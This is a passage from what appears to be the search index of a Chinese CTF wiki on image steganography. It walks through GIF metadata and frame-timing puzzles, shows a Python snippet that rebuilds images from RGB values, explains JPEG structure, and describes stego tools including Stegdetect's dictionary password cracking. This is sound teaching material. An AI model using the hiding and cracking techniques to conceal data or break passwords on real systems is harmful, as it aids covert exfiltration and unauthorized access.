\uff0c\u63d0\u53d6\u6bcf\u4e00\u5e27\u95f4\u9694\u5e76\u8fdb\u884c\u8f6c\u5316\u3002 $ cat flag | cut -d ' ' -f 2 | tr -d '66' | tr -d '\\n' | tr -d '0' | tr '2' '0' 0101100001001101010000010100111001111011001110010011011000110101001101110011010101100010011001010110010101100100001101000110010001100101011000010011000100111000011001000110010101100100001101000011011100110011001101010011011000110100001100110110000101100101011000110110011001100001001100110011010101111101 # \u6700\u540e\u8f6c ASCII \u7801\u5f97\u5230 flag\u3002","title":"\u65f6\u95f4\u8f74"},{"location":"misc/picture/gif/#_5","text":"F5-steganography","title":"\u9690\u5199\u8f6f\u4ef6"},{"location":"misc/picture/introduction/","text":"\u56fe\u50cf\u6587\u4ef6\u80fd\u591f\u5f88\u597d\u5730\u5305\u542b\u9ed1\u5ba2\u6587\u5316\uff0c\u56e0\u6b64 CTF \u7ade\u8d5b\u4e2d\u7ecf\u5e38\u4f1a\u51fa\u73b0\u5404\u79cd\u56fe\u50cf\u6587\u4ef6\u3002 \u56fe\u50cf\u6587\u4ef6\u6709\u591a\u79cd\u590d\u6742\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u7528\u4e8e\u5404\u79cd\u6d89\u53ca\u5230\u5143\u6570\u636e\u3001\u4fe1\u606f\u4e22\u5931\u548c\u65e0\u635f\u538b\u7f29\u3001\u6821\u9a8c\u3001\u9690\u5199\u6216\u53ef\u89c6\u5316\u6570\u636e\u7f16\u7801\u7684\u5206\u6790\u89e3\u5bc6\uff0c\u90fd\u662f Misc \u4e2d\u7684\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u51fa\u9898\u65b9\u5411\u3002\u6d89\u53ca\u5230\u7684\u77e5\u8bc6\u70b9\u5f88\u591a\uff08\u5305\u62ec\u57fa\u672c\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5e38\u89c1\u7684\u9690\u5199\u624b\u6cd5\u53ca\u9690\u5199\u7528\u7684\u8f6f\u4ef6\uff09\uff0c\u6709\u7684\u5730\u65b9\u4e5f\u9700\u8981\u53bb\u8fdb\u884c\u6df1\u5165\u7684\u7406\u89e3\u3002 \u5143\u6570\u636e\uff08Metadata\uff09 \u00b6 \u5143\u6570\u636e\uff08Metadata\uff09\uff0c\u53c8\u79f0\u4e2d\u4ecb\u6570\u636e\u3001\u4e2d\u7ee7\u6570\u636e\uff0c\u4e3a\u63cf\u8ff0\u6570\u636e\u7684\u6570\u636e\uff08Data about data\uff09\uff0c\u4e3b\u8981\u662f\u63cf\u8ff0\u6570\u636e\u5c5e\u6027\uff08property\uff09\u7684\u4fe1\u606f\uff0c\u7528\u6765\u652f\u6301\u5982\u6307\u793a\u5b58\u50a8\u4f4d\u7f6e\u3001\u5386\u53f2\u6570\u636e\u3001\u8d44\u6e90\u67e5\u627e\u3001\u6587\u4ef6\u8bb0\u5f55\u7b49\u529f\u80fd\u3002 \u5143\u6570\u636e\u4e2d\u9690\u85cf\u4fe1\u606f\u5728\u6bd4\u8d5b\u4e2d\u662f\u6700\u57fa\u672c\u7684\u4e00\u79cd\u624b\u6cd5\uff0c\u901a\u5e38\u7528\u6765\u9690\u85cf\u4e00\u4e9b\u5173\u952e\u7684 Hint \u4fe1\u606f\u6216\u8005\u662f\u4e00\u4e9b\u91cd\u8981\u7684\u5982 password \u7b49\u4fe1\u606f\u3002 \u8fd9\u7c7b\u5143\u6570\u636e\u4f60\u53ef\u4ee5 \u53f3\u952e --> \u5c5e\u6027 \u53bb\u67e5\u770b,\u4e5f\u53ef\u4ee5\u901a\u8fc7 strings \u547d\u4ee4\u53bb\u67e5\u770b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e9b\u9690\u85cf\u7684\u4fe1\u606f\uff08\u5947\u602a\u7684\u5b57\u7b26\u4e32\uff09\u5e38\u5e38\u51fa\u73b0\u5728\u5934\u90e8\u6216\u8005\u5c3e\u90e8\u3002 \u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e00\u4e2a identify \u547d\u4ee4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u662f\u7528\u6765\u83b7\u53d6\u4e00\u4e2a\u6216\u591a\u4e2a\u56fe\u50cf\u6587\u4ef6\u7684\u683c\u5f0f\u548c\u7279\u6027\u3002 -format \u7528\u6765\u6307\u5b9a\u663e\u793a\u7684\u4fe1\u606f\uff0c\u7075\u6d3b\u4f7f\u7528\u5b83\u7684 -format \u53c2\u6570\u53ef\u4ee5\u7ed9\u89e3\u9898\u5e26\u6765\u4e0d\u5c11\u65b9\u4fbf\u3002 format\u5404\u4e2a\u53c2\u6570\u5177\u4f53\u610f\u4e49 \u4f8b\u9898 \u00b6 Break In 2017 - Mysterious GIF \u8fd9\u9898\u7684\u4e00\u4e2a\u96be\u70b9\u662f\u53d1\u73b0\u5e76\u63d0\u53d6 GIF \u4e2d\u7684\u5143\u6570\u636e\uff0c\u9996\u5148 strings \u662f\u53ef\u4ee5\u89c2\u5bdf\u5230\u5f02\u5e38\u70b9\u7684\u3002 GIF89a !!! \"\"\"### $$ $ %%%&&&'''((()))***+++,,,---...///000111222333444555666777888999:::;;;<<<===>>>???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~ 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 NETSCAPE2.0 ImageMagick ... \u8fd9\u91cc\u7684\u4e00\u4e3216\u8fdb\u5236\u5176\u5b9e\u662f\u85cf\u5728 GIF \u7684\u5143\u6570\u636e\u533a \u63a5\u4e0b\u6765\u5c31\u662f\u63d0\u53d6\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9 Python\uff0c\u4f46\u662f\u5229\u7528 identify \u663e\u5f97\u66f4\u52a0\u4fbf\u6377 root in ~/Desktop/tmp \u03bb identify -format \"%s %c \\n\" Question.gif 0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 1 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271 ... 24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f 25 724b3052485a6b745062457335797444737142486435504646773d3d \u5176\u4ed6\u8fc7\u7a0b\u8fd9\u91cc\u4e0d\u5728\u53d9\u8ff0\uff0c\u53ef\u53c2\u8003\u94fe\u63a5\u4e2d\u7684 Writeup \u50cf\u7d20\u503c\u8f6c\u5316 \u00b6 \u770b\u770b\u8fd9\u4e2a\u6587\u4ef6\u91cc\u7684\u6570\u636e\uff0c\u4f60\u80fd\u60f3\u5230\u4ec0\u4e48\uff1f 255,255,255,255,255........... \u662f\u4e00\u4e32 RGB \u503c\uff0c\u5c1d\u8bd5\u7740\u5c06\u4ed6\u8f6c\u5316\u4e3a\u56fe\u7247 from PIL import Image import re x = 307 #x\u5750\u6807 \u901a\u8fc7\u5bf9txt\u91cc\u7684\u884c\u6570\u8fdb\u884c\u6574\u6570\u5206\u89e3 y = 311 #y\u5750\u6807 x*y = \u884c\u6570 rgb1 = [ **** ] print len ( rgb1 ) / 3 m = 0 for i in xrange ( 0 , x ): for j in xrange ( 0 , y ): line = rgb1 [( 3 * m ):( 3 * ( m + 1 ))] #\u83b7\u53d6\u4e00\u884c m += 1 rgb = line im . putpixel (( i , j ),( int ( rgb [ 0 ]), int ( rgb [ 1 ]), int ( rgb [ 2 ]))) #rgb\u8f6c\u5316\u4e3a\u50cf\u7d20 im . show () im . save ( \"flag.png\" ) \u800c\u5982\u679c\u53cd\u8fc7\u6765\u7684\u8bdd\uff0c\u4ece\u4e00\u5f20\u56fe\u7247\u63d0\u53d6 RGB \u503c\uff0c\u518d\u5bf9 RGB \u503c\u53bb\u8fdb\u884c\u4e00\u4e9b\u5bf9\u6bd4\uff0c\u4ece\u800c\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002 \u8fd9\u7c7b\u9898\u76ee\u5927\u90e8\u5206\u90fd\u662f\u4e00\u4e9b\u50cf\u7d20\u5757\u7ec4\u6210\u7684\u56fe\u7247\uff0c\u5982\u4e0b\u56fe \u76f8\u5173\u9898\u76ee: CSAW-2016-quals:Forensic/Barinfun breakin-ctf-2017:A-dance-partner","title":"\u56fe\u7247\u5206\u6790\u7b80\u4ecb"},{"location":"misc/picture/introduction/#metadata","text":"\u5143\u6570\u636e\uff08Metadata\uff09\uff0c\u53c8\u79f0\u4e2d\u4ecb\u6570\u636e\u3001\u4e2d\u7ee7\u6570\u636e\uff0c\u4e3a\u63cf\u8ff0\u6570\u636e\u7684\u6570\u636e\uff08Data about data\uff09\uff0c\u4e3b\u8981\u662f\u63cf\u8ff0\u6570\u636e\u5c5e\u6027\uff08property\uff09\u7684\u4fe1\u606f\uff0c\u7528\u6765\u652f\u6301\u5982\u6307\u793a\u5b58\u50a8\u4f4d\u7f6e\u3001\u5386\u53f2\u6570\u636e\u3001\u8d44\u6e90\u67e5\u627e\u3001\u6587\u4ef6\u8bb0\u5f55\u7b49\u529f\u80fd\u3002 \u5143\u6570\u636e\u4e2d\u9690\u85cf\u4fe1\u606f\u5728\u6bd4\u8d5b\u4e2d\u662f\u6700\u57fa\u672c\u7684\u4e00\u79cd\u624b\u6cd5\uff0c\u901a\u5e38\u7528\u6765\u9690\u85cf\u4e00\u4e9b\u5173\u952e\u7684 Hint \u4fe1\u606f\u6216\u8005\u662f\u4e00\u4e9b\u91cd\u8981\u7684\u5982 password \u7b49\u4fe1\u606f\u3002 \u8fd9\u7c7b\u5143\u6570\u636e\u4f60\u53ef\u4ee5 \u53f3\u952e --> \u5c5e\u6027 \u53bb\u67e5\u770b,\u4e5f\u53ef\u4ee5\u901a\u8fc7 strings \u547d\u4ee4\u53bb\u67e5\u770b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e9b\u9690\u85cf\u7684\u4fe1\u606f\uff08\u5947\u602a\u7684\u5b57\u7b26\u4e32\uff09\u5e38\u5e38\u51fa\u73b0\u5728\u5934\u90e8\u6216\u8005\u5c3e\u90e8\u3002 \u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e00\u4e2a identify \u547d\u4ee4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u662f\u7528\u6765\u83b7\u53d6\u4e00\u4e2a\u6216\u591a\u4e2a\u56fe\u50cf\u6587\u4ef6\u7684\u683c\u5f0f\u548c\u7279\u6027\u3002 -format \u7528\u6765\u6307\u5b9a\u663e\u793a\u7684\u4fe1\u606f\uff0c\u7075\u6d3b\u4f7f\u7528\u5b83\u7684 -format \u53c2\u6570\u53ef\u4ee5\u7ed9\u89e3\u9898\u5e26\u6765\u4e0d\u5c11\u65b9\u4fbf\u3002 format\u5404\u4e2a\u53c2\u6570\u5177\u4f53\u610f\u4e49","title":"\u5143\u6570\u636e\uff08Metadata\uff09"},{"location":"misc/picture/introduction/#_1","text":"Break In 2017 - Mysterious GIF \u8fd9\u9898\u7684\u4e00\u4e2a\u96be\u70b9\u662f\u53d1\u73b0\u5e76\u63d0\u53d6 GIF \u4e2d\u7684\u5143\u6570\u636e\uff0c\u9996\u5148 strings \u662f\u53ef\u4ee5\u89c2\u5bdf\u5230\u5f02\u5e38\u70b9\u7684\u3002 GIF89a !!! \"\"\"### $$ $ %%%&&&'''((()))***+++,,,---...///000111222333444555666777888999:::;;;<<<===>>>???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~ 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 NETSCAPE2.0 ImageMagick ... \u8fd9\u91cc\u7684\u4e00\u4e3216\u8fdb\u5236\u5176\u5b9e\u662f\u85cf\u5728 GIF \u7684\u5143\u6570\u636e\u533a \u63a5\u4e0b\u6765\u5c31\u662f\u63d0\u53d6\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9 Python\uff0c\u4f46\u662f\u5229\u7528 identify \u663e\u5f97\u66f4\u52a0\u4fbf\u6377 root in ~/Desktop/tmp \u03bb identify -format \"%s %c \\n\" Question.gif 0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 1 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271 ... 24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f 25 724b3052485a6b745062457335797444737142486435504646773d3d \u5176\u4ed6\u8fc7\u7a0b\u8fd9\u91cc\u4e0d\u5728\u53d9\u8ff0\uff0c\u53ef\u53c2\u8003\u94fe\u63a5\u4e2d\u7684 Writeup","title":"\u4f8b\u9898"},{"location":"misc/picture/introduction/#_2","text":"\u770b\u770b\u8fd9\u4e2a\u6587\u4ef6\u91cc\u7684\u6570\u636e\uff0c\u4f60\u80fd\u60f3\u5230\u4ec0\u4e48\uff1f 255,255,255,255,255........... \u662f\u4e00\u4e32 RGB \u503c\uff0c\u5c1d\u8bd5\u7740\u5c06\u4ed6\u8f6c\u5316\u4e3a\u56fe\u7247 from PIL import Image import re x = 307 #x\u5750\u6807 \u901a\u8fc7\u5bf9txt\u91cc\u7684\u884c\u6570\u8fdb\u884c\u6574\u6570\u5206\u89e3 y = 311 #y\u5750\u6807 x*y = \u884c\u6570 rgb1 = [ **** ] print len ( rgb1 ) / 3 m = 0 for i in xrange ( 0 , x ): for j in xrange ( 0 , y ): line = rgb1 [( 3 * m ):( 3 * ( m + 1 ))] #\u83b7\u53d6\u4e00\u884c m += 1 rgb = line im . putpixel (( i , j ),( int ( rgb [ 0 ]), int ( rgb [ 1 ]), int ( rgb [ 2 ]))) #rgb\u8f6c\u5316\u4e3a\u50cf\u7d20 im . show () im . save ( \"flag.png\" ) \u800c\u5982\u679c\u53cd\u8fc7\u6765\u7684\u8bdd\uff0c\u4ece\u4e00\u5f20\u56fe\u7247\u63d0\u53d6 RGB \u503c\uff0c\u518d\u5bf9 RGB \u503c\u53bb\u8fdb\u884c\u4e00\u4e9b\u5bf9\u6bd4\uff0c\u4ece\u800c\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002 \u8fd9\u7c7b\u9898\u76ee\u5927\u90e8\u5206\u90fd\u662f\u4e00\u4e9b\u50cf\u7d20\u5757\u7ec4\u6210\u7684\u56fe\u7247\uff0c\u5982\u4e0b\u56fe \u76f8\u5173\u9898\u76ee: CSAW-2016-quals:Forensic/Barinfun breakin-ctf-2017:A-dance-partner","title":"\u50cf\u7d20\u503c\u8f6c\u5316"},{"location":"misc/picture/jpg/","text":"\u6587\u4ef6\u7ed3\u6784 \u00b6 JPEG \u662f\u6709\u635f\u538b\u7f29\u683c\u5f0f\uff0c\u5c06\u50cf\u7d20\u4fe1\u606f\u7528 JPEG \u4fdd\u5b58\u6210\u6587\u4ef6\u518d\u8bfb\u53d6\u51fa\u6765\uff0c\u5176\u4e2d\u67d0\u4e9b\u50cf\u7d20\u503c\u4f1a\u6709\u5c11\u8bb8\u53d8\u5316\u3002\u5728\u4fdd\u5b58\u65f6\u6709\u4e2a\u8d28\u91cf\u53c2\u6570\u53ef\u5728 0 \u81f3 100 \u4e4b\u95f4\u9009\u62e9\uff0c\u53c2\u6570\u8d8a\u5927\u56fe\u7247\u5c31\u8d8a\u4fdd\u771f\uff0c\u4f46\u56fe\u7247\u7684\u4f53\u79ef\u4e5f\u5c31\u8d8a\u5927\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u9009\u62e9 70 \u6216 80 \u5c31\u8db3\u591f\u4e86 JPEG \u6ca1\u6709\u900f\u660e\u5ea6\u4fe1\u606f JPG \u57fa\u672c\u6570\u636e\u7ed3\u6784\u4e3a\u4e24\u5927\u7c7b\u578b\uff1a\u300c\u6bb5\u300d\u548c\u7ecf\u8fc7\u538b\u7f29\u7f16\u7801\u7684\u56fe\u50cf\u6570\u636e\u3002 \u540d \u79f0 \u5b57\u8282\u6570 \u6570\u636e \u8bf4\u660e \u6bb5 \u6807\u8bc6 1 FF \u6bcf\u4e2a\u65b0\u6bb5\u7684\u5f00\u59cb\u6807\u8bc6 \u6bb5\u7c7b\u578b 1 \u7c7b\u578b\u7f16\u7801\uff08\u79f0\u4f5c\u6807\u8bb0\u7801\uff09 \u6bb5\u957f \u5ea6 2 \u5305\u62ec\u6bb5\u5185\u5bb9\u548c\u6bb5\u957f\u5ea6\u672c\u8eab,\u4e0d\u5305\u62ec\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b \u6bb5\u5185\u5bb9 2 \u226465533\u5b57\u8282 \u6709\u4e9b\u6bb5\u6ca1\u6709\u957f\u5ea6\u63cf\u8ff0\u4e5f\u6ca1\u6709\u5185\u5bb9\uff0c\u53ea\u6709\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b\u3002\u6587\u4ef6\u5934\u548c\u6587\u4ef6\u5c3e\u5747\u5c5e\u4e8e\u8fd9\u79cd\u6bb5\u3002 \u6bb5\u4e0e\u6bb5\u4e4b\u95f4\u65e0\u8bba\u6709\u591a\u5c11 FF \u90fd\u662f\u5408\u6cd5\u7684\uff0c\u8fd9\u4e9b FF \u79f0\u4e3a\u300c\u586b\u5145\u5b57\u8282\u300d\uff0c\u5fc5\u987b\u88ab\u5ffd\u7565\u6389\u3002 \u4e00\u4e9b\u5e38\u89c1\u7684\u6bb5\u7c7b\u578b 0xffd8 \u548c 0xffd9 \u4e3a JPG \u6587\u4ef6\u7684\u5f00\u59cb\u7ed3\u675f\u7684\u6807\u5fd7\u3002 \u9690\u5199\u8f6f\u4ef6 \u00b6 Stegdetect \u00b6 \u901a\u8fc7\u7edf\u8ba1\u5206\u6790\u6280\u672f\u8bc4\u4f30 JPEG \u6587\u4ef6\u7684 DCT \u9891\u7387\u7cfb\u6570\u7684\u9690\u5199\u5de5\u5177, \u53ef\u4ee5\u68c0\u6d4b\u5230\u901a\u8fc7 JSteg\u3001JPHide\u3001OutGuess\u3001Invisible Secrets\u3001F5\u3001appendX \u548c Camouflage \u7b49\u8fd9\u4e9b\u9690\u5199\u5de5\u5177\u9690\u85cf\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u8fd8\u5177\u6709\u57fa\u4e8e\u5b57\u5178\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u65b9\u6cd5\u63d0\u53d6\u901a\u8fc7 Jphide\u3001outguess \u548c jsteg-shell \u65b9\u5f0f\u5d4c\u5165\u7684\u9690\u85cf\u4fe1\u606f\u3002 -q \u4ec5\u663e\u793a\u53ef\u80fd\u5305\u542b\u9690\u85cf\u5185\u5bb9\u7684\u56fe\u50cf\u3002 -n \u542f\u7528\u68c0\u67e5JPEG\u6587\u4ef6\u5934\u529f\u80fd\uff0c\u4ee5\u964d\u4f4e\u8bef\u62a5\u7387\u3002\u5982\u679c\u542f\u7528\uff0c\u6240\u6709\u5e26\u6709\u6279\u6ce8\u533a\u57df\u7684\u6587\u4ef6\u5c06\u88ab\u89c6\u4e3a\u6ca1\u6709\u88ab\u5d4c\u5165\u4fe1\u606f\u3002\u5982\u679cJPEG\u6587\u4ef6\u7684JFIF\u6807\u8bc6\u7b26\u4e2d\u7684\u7248\u672c\u53f7\u4e0d\u662f1.1\uff0c\u5219\u7981\u7528OutGuess\u68c0\u6d4b\u3002 -s \u4fee\u6539\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\uff0c\u8be5\u503c\u7684\u9ed8\u8ba4\u503c\u4e3a1\u3002\u68c0\u6d4b\u7ed3\u679c\u7684\u5339\u914d\u5ea6\u4e0e\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\u6210\u6b63\u6bd4\uff0c\u7b97\u6cd5\u654f\u611f\u5ea6\u7684\u503c\u8d8a\u5927\uff0c\u68c0\u6d4b\u51fa\u7684\u53ef\u7591\u6587\u4ef6\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u53ef\u80fd\u6027\u8d8a\u5927\u3002 -d \u6253\u5370\u5e26\u884c\u53f7\u7684\u8c03\u8bd5\u4fe1\u606f\u3002 -t \u8bbe\u7f6e\u8981\u68c0\u6d4b\u54ea\u4e9b\u9690\u5199\u5de5\u5177\uff08\u9ed8\u8ba4\u68c0\u6d4bjopi\uff09\uff0c\u53ef\u8bbe\u7f6e\u7684\u9009\u9879\u5982\u4e0b\uff1a j \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jsteg\u5d4c\u5165\u7684\u3002 o \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528outguess\u5d4c\u5165\u7684\u3002 p \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jphide\u5d4c\u5165\u7684\u3002 i \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528invisible secrets\u5d4c\u5165\u7684\u3002 JPHS \u00b6 JPEG \u56fe\u50cf\u7684\u4fe1\u606f\u9690\u85cf\u8f6f\u4ef6 JPHS\uff0c\u5b83\u662f\u7531 Allan Latham \u5f00\u53d1\u8bbe\u8ba1\u5b9e\u73b0\u5728 Windows \u548c Linux \u7cfb\u7edf\u5e73\u53f0\u9488\u5bf9\u6709\u635f\u538b\u7f29 JPEG \u6587\u4ef6\u8fdb\u884c\u4fe1\u606f\u52a0\u5bc6\u9690\u85cf\u548c\u63a2\u6d4b\u63d0\u53d6\u7684\u5de5\u5177\u3002\u8f6f\u4ef6\u91cc\u9762\u4e3b\u8981\u5305\u542b\u4e86\u4e24\u4e2a\u7a0b\u5e8f JPHIDE\u548c JPSEEK\u3002JPHIDE \u7a0b\u5e8f\u4e3b\u8981\u662f\u5b9e\u73b0\u5c06\u4fe1\u606f\u6587\u4ef6\u52a0\u5bc6\u9690\u85cf\u5230 JPEG \u56fe\u50cf\u529f\u80fd\uff0c\u800c JPSEEK \u7a0b\u5e8f\u4e3b\u8981\u5b9e\u73b0\u4ece\u7528 JPHIDE \u7a0b\u5e8f\u52a0\u5bc6\u9690\u85cf\u5f97\u5230\u7684 JPEG \u56fe\u50cf\u63a2\u6d4b\u63d0\u53d6\u4fe1\u606f\u6587\u4ef6\uff0cWindows \u7248\u672c\u7684 JPHS \u91cc\u7684 JPHSWIN \u7a0b\u5e8f\u5177\u6709\u56fe\u5f62\u5316\u64cd\u4f5c\u754c\u9762\u4e14\u5177\u5907 JPHIDE \u548c JPSEEK \u7684\u529f\u80fd\u3002 SilentEye \u00b6 SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.","title":"JPG"},{"location":"misc/picture/jpg/#_1","text":"JPEG \u662f\u6709\u635f\u538b\u7f29\u683c\u5f0f\uff0c\u5c06\u50cf\u7d20\u4fe1\u606f\u7528 JPEG \u4fdd\u5b58\u6210\u6587\u4ef6\u518d\u8bfb\u53d6\u51fa\u6765\uff0c\u5176\u4e2d\u67d0\u4e9b\u50cf\u7d20\u503c\u4f1a\u6709\u5c11\u8bb8\u53d8\u5316\u3002\u5728\u4fdd\u5b58\u65f6\u6709\u4e2a\u8d28\u91cf\u53c2\u6570\u53ef\u5728 0 \u81f3 100 \u4e4b\u95f4\u9009\u62e9\uff0c\u53c2\u6570\u8d8a\u5927\u56fe\u7247\u5c31\u8d8a\u4fdd\u771f\uff0c\u4f46\u56fe\u7247\u7684\u4f53\u79ef\u4e5f\u5c31\u8d8a\u5927\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u9009\u62e9 70 \u6216 80 \u5c31\u8db3\u591f\u4e86 JPEG \u6ca1\u6709\u900f\u660e\u5ea6\u4fe1\u606f JPG \u57fa\u672c\u6570\u636e\u7ed3\u6784\u4e3a\u4e24\u5927\u7c7b\u578b\uff1a\u300c\u6bb5\u300d\u548c\u7ecf\u8fc7\u538b\u7f29\u7f16\u7801\u7684\u56fe\u50cf\u6570\u636e\u3002 \u540d \u79f0 \u5b57\u8282\u6570 \u6570\u636e \u8bf4\u660e \u6bb5 \u6807\u8bc6 1 FF \u6bcf\u4e2a\u65b0\u6bb5\u7684\u5f00\u59cb\u6807\u8bc6 \u6bb5\u7c7b\u578b 1 \u7c7b\u578b\u7f16\u7801\uff08\u79f0\u4f5c\u6807\u8bb0\u7801\uff09 \u6bb5\u957f \u5ea6 2 \u5305\u62ec\u6bb5\u5185\u5bb9\u548c\u6bb5\u957f\u5ea6\u672c\u8eab,\u4e0d\u5305\u62ec\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b \u6bb5\u5185\u5bb9 2 \u226465533\u5b57\u8282 \u6709\u4e9b\u6bb5\u6ca1\u6709\u957f\u5ea6\u63cf\u8ff0\u4e5f\u6ca1\u6709\u5185\u5bb9\uff0c\u53ea\u6709\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b\u3002\u6587\u4ef6\u5934\u548c\u6587\u4ef6\u5c3e\u5747\u5c5e\u4e8e\u8fd9\u79cd\u6bb5\u3002 \u6bb5\u4e0e\u6bb5\u4e4b\u95f4\u65e0\u8bba\u6709\u591a\u5c11 FF \u90fd\u662f\u5408\u6cd5\u7684\uff0c\u8fd9\u4e9b FF \u79f0\u4e3a\u300c\u586b\u5145\u5b57\u8282\u300d\uff0c\u5fc5\u987b\u88ab\u5ffd\u7565\u6389\u3002 \u4e00\u4e9b\u5e38\u89c1\u7684\u6bb5\u7c7b\u578b 0xffd8 \u548c 0xffd9 \u4e3a JPG \u6587\u4ef6\u7684\u5f00\u59cb\u7ed3\u675f\u7684\u6807\u5fd7\u3002","title":"\u6587\u4ef6\u7ed3\u6784"},{"location":"misc/picture/jpg/#_2","text":"","title":"\u9690\u5199\u8f6f\u4ef6"},{"location":"misc/picture/jpg/#stegdetect","text":"\u901a\u8fc7\u7edf\u8ba1\u5206\u6790\u6280\u672f\u8bc4\u4f30 JPEG \u6587\u4ef6\u7684 DCT \u9891\u7387\u7cfb\u6570\u7684\u9690\u5199\u5de5\u5177, \u53ef\u4ee5\u68c0\u6d4b\u5230\u901a\u8fc7 JSteg\u3001JPHide\u3001OutGuess\u3001Invisible Secrets\u3001F5\u3001appendX \u548c Camouflage \u7b49\u8fd9\u4e9b\u9690\u5199\u5de5\u5177\u9690\u85cf\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u8fd8\u5177\u6709\u57fa\u4e8e\u5b57\u5178\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u65b9\u6cd5\u63d0\u53d6\u901a\u8fc7 Jphide\u3001outguess \u548c jsteg-shell \u65b9\u5f0f\u5d4c\u5165\u7684\u9690\u85cf\u4fe1\u606f\u3002 -q \u4ec5\u663e\u793a\u53ef\u80fd\u5305\u542b\u9690\u85cf\u5185\u5bb9\u7684\u56fe\u50cf\u3002 -n \u542f\u7528\u68c0\u67e5JPEG\u6587\u4ef6\u5934\u529f\u80fd\uff0c\u4ee5\u964d\u4f4e\u8bef\u62a5\u7387\u3002\u5982\u679c\u542f\u7528\uff0c\u6240\u6709\u5e26\u6709\u6279\u6ce8\u533a\u57df\u7684\u6587\u4ef6\u5c06\u88ab\u89c6\u4e3a\u6ca1\u6709\u88ab\u5d4c\u5165\u4fe1\u606f\u3002\u5982\u679cJPEG\u6587\u4ef6\u7684JFIF\u6807\u8bc6\u7b26\u4e2d\u7684\u7248\u672c\u53f7\u4e0d\u662f1.1\uff0c\u5219\u7981\u7528OutGuess\u68c0\u6d4b\u3002 -s \u4fee\u6539\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\uff0c\u8be5\u503c\u7684\u9ed8\u8ba4\u503c\u4e3a1\u3002\u68c0\u6d4b\u7ed3\u679c\u7684\u5339\u914d\u5ea6\u4e0e\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\u6210\u6b63\u6bd4\uff0c\u7b97\u6cd5\u654f\u611f\u5ea6\u7684\u503c\u8d8a\u5927\uff0c\u68c0\u6d4b\u51fa\u7684\u53ef\u7591\u6587\u4ef6\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u53ef\u80fd\u6027\u8d8a\u5927\u3002 -d \u6253\u5370\u5e26\u884c\u53f7\u7684\u8c03\u8bd5\u4fe1\u606f\u3002 -t \u8bbe\u7f6e\u8981\u68c0\u6d4b\u54ea\u4e9b\u9690\u5199\u5de5\u5177\uff08\u9ed8\u8ba4\u68c0\u6d4bjopi\uff09\uff0c\u53ef\u8bbe\u7f6e\u7684\u9009\u9879\u5982\u4e0b\uff1a j \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jsteg\u5d4c\u5165\u7684\u3002 o \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528outguess\u5d4c\u5165\u7684\u3002 p 